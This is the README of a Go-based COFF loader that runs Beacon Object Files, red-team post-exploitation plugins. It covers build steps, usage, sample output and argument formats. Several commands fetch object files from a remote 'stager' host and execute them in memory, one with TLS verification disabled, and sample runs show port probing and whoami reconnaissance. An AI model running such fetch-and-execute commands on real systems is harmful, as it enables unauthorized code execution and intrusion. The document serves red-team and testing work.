Go COFF loader.

## Build

Build on Windows:

```powershell
make build
```

## Usage

```powershell
# load from a file with a custom entry point
.\gol.exe --file .\whoami.x64.o --entry go

# load from a URL via HTTP/S
.\gol.exe --url http://stager:8080/somebof.o
.\gol.exe --url https://stager:8080/somebof.o --insecure-skip-verify

# run in verbose mode with some extra debug information
.\gol.exe --url http://stager:8080/somebof.o --verbose

# provide arguments to a COFF
.\gol.exe --file .\probe.x64.o --arg DC1 --arg 88
```

### Sample Output

```powershell
> .\gol.exe --url https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/refs/heads/master/SA/probe/probe.x64.o --arg WEB01 --arg 443
[*] Loading object file: https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/refs/heads/master/SA/probe/probe.x64.o
[+] Object file loaded [3857 bytes]
WEB01:443 OPEN

[+] Object file successfully executed
```

```powershell
> .\gol.exe --url https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/refs/heads/master/SA/sha256/sha256.x64.o --arg gol
[*] Loading object file: https://github.com/trustedsec/CS-Situational-Awareness-BOF/raw/refs/heads/master/SA/sha256/sha256.x64.o
[+] Object file loaded [4205 bytes]
SHA-256 Hash for gol: 51754EB20233C17BBB1966CD4F94165A1337BCA16FAFA9CA326AB553F9BBC4A7
[+] Object file successfully executed
```

```powershell
> .\gol.exe --url http://localhost:8822/whoami.x64.o
[*] Loading object file: http://localhost:8822/whoami.x64.o
[+] Object file loaded [6877 bytes]

UserName                SID
====================== ====================================
PERFECT\alt     S-1-5-21-1653667505-1157322366-4375677965-1001

<snip>
```

## BOF Arguments

Use `--arg` for ordinary arguments. Repeat it for multiple values.

```powershell
.\gol.exe --file .\hostname.x64.o --arg dc01
.\gol.exe --file .\lookup.x64.o --arg dc01 --arg alice
.\gol.exe --file .\probe.x64.o --arg google.com --arg 443
```

Some BOFs expect non-string values through `BeaconDataInt`,
`BeaconDataShort`, UTF-16 strings, or raw bytes. For those cases use the
advanced `--bof-format` flag with one repeated `--bof-arg` per format
character.

Supported format characters:

- `z`: null-terminated string for `BeaconDataExtract`
- `Z`: null-terminated UTF-16LE string for `BeaconDataExtract`
- `i`: signed 32-bit integer for `BeaconDataInt`
- `s`: signed 16-bit integer for `BeaconDataShort`
- `b`: base64-decoded bytes for `BeaconDataExtract`
